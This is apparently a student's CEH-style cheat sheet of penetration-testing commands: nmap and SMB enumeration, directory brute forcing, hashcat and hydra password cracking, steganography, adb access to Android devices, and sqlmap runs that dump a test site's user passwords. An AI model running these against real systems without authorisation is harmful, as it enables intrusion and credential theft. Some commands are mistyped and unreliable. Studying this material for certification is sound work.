# Command

**All the commands that you need to know:**

How many machines are active in a network - net discover -i 192.168.1.0/24

Connect to RDP via cmd - mstsc

- **Find DNS records -** [https://www.nslookup.io/](https://www.nslookup.io/)

Scan the whole website- (skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl [http://10.10.10.10:8080](http://10.10.10.10:8080/))

- o output
- S wordlist
- **To brute force directories or files-**

robuster dir  -u 10.10.10.10  -w /usr/share/dirb/wordlists/common.txt  -x  .txt

OR

uniscan -u [http://10.10.10.12:8080/CEH](http://10.10.10.12:8080/CEH) -q   (for directories)

uniscan –u [http://10.10.10.12:8080/CEH](http://10.10.10.12:8080/CEH) -we (enable file check like robots.txt and sitemap.xml)

- **To get the file from the server-** get [http://10.10.10.10/secret.txt](http://10.10.10.10/secret.txt)
- **FTP Login -** ftp <ip>

get <file name>   (to get file from FTP login)

**SSH Login** - SSH username@10.10.10.10

- **Nmap scan**

Nmap  -A 10.10.10.10  (aggressive scan- Traceroute, T4, OS)

nmap  -sC  (service scan)

nmap -sV  (version scan)

nmap  -sP 10.10.10.10/24  (how many hosts are up in the whole network)/ping scan

nmap  -sL  (hostnames)

nmap  -oN <filename>  (to save output in a file)

nmap  -F  (fast scan)

nmap  -O  (os scan)

- **Crack the hashes-**

hashid  -m <hash>  (to identify the type of hash, its mode etc)

hashcat  -m <mode>  -a 0  <hashhhhhhhh> /usr/share/wordlist/rockyou.txt

crackstation

[hashes.com](http://hashes.com/)

Cyberchef

- **Enumeration-**

Global network inventory

Netbios enumerator

Hyena

Superscan

Advanced ip scanner

- **nmap smb scripts-**

nmap --script smb-os-discovery.nse -p445 <ip>  (enumerate os, domain name,etc)

nmap --script smb-enum-users.nse -p445 <ip>  (used to enumerate all users on remote Windows system using SAMR enumeration and LSA bruteforcing)

nmap -p 445 --script=smb-enum-shares.nse, smb-enum-users.nse 10.10.19.21 (smb users and shares)

smbclient //10.10.19.21/anonymous  (accessing smb shares)

smbget -R smb://10.10.19.21/anonymous   (downloading smb files)

- **enum4linux**

enum4linux -u martin -p apple -U 10.10.10.12 | - u user -p pass -U get user list

enum4linux -u martin -p apple -o 10.10.10.12 | -o get OS info

enum4linux -u martin -p apple -P 10.10.10.12 | -P get password policy info

enum4linux -u martin -p apple -G 10.10.10.12 | -G get groups and members info

enum4linux -u martin -p apple -S 10.10.10.12 | -S get share list info

enum4linux -u martin -p apple -a 10.10.10.12 | -a get all simple enumeration data [-U -S -G -P -r -o -n -i]

- **Wpscan**

**wpscan --url http://[IP Address]:8080/CEH --enumerate u  (**enumerate the usernames stored in the website’s database)

- **Vulnerability analysis**

nikto  -h  [http://testphp.vulnweb.com/login.php](http://testphp.vulnweb.com/login.php) -Tuning 1

- **Bruteforce-**

Hydra  -L username  -P /usr/share/wordlists/rockyou.txt [ftp://xiotz.com](ftp://xiotz.com/)

- **Cryptography-**

Hashcalc

Md5 calculator

Cryptool – decode .hex file

Bctextencoder – decrypt text using secret key

Veracrypt – anything related to volume

1. **Crack hashes-** [hashes.com](http://hashes.com/), cyberchef
2. **Steganography-**
3. Steghide embed -ef <filename> -cf <image> -p <passphrase>
4. Steghide extract -sf <image> (extract hidden data from image)
5. Stegcracker <image> /usr/share/wordlists/rockyou.txt (crack the passphrase of image)
6.  [https://futureboy.us/stegano/decinput.html](https://futureboy.us/stegano/decinput.html) (online steganography tool)
7. sha256sum <filename> (find hash of the file)
- **Android Hacking-**

via USB

./adb tcpip 5555

./adb connect 192.168.43.117:5555

./adb devices

./adb  -d shell (Direct an adb command to the only attached USB device)

ls

cd sdcard

ls

cd dcim

cd camera

ls

./adb   push                C:\platform-tools\[ota.zip](http://ota.zip/) /sdcard/Download           (from pc to android)

<            pc location   >                  <android location>

./adb   pull     /sdcard/Download/magisk_patched.img       C:\platform-tools            (from android to pc)

<            android location   >                      <pc location>

- **sqlmap-**

site:[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/) php?= (for finding vulnerable site)

(for cookies- console->document.cookie)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1) --dbs   (databases)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1) -D acuart –tables   (tables)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1) -D acuart -T users --columns   (columns)

(dump whole table)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1) -D acuart -T users  --dump

OR

(dump individual  column data)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1) -D acuart -T users -C uname  --dump

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1) -D acuart -T users -C pass  --dump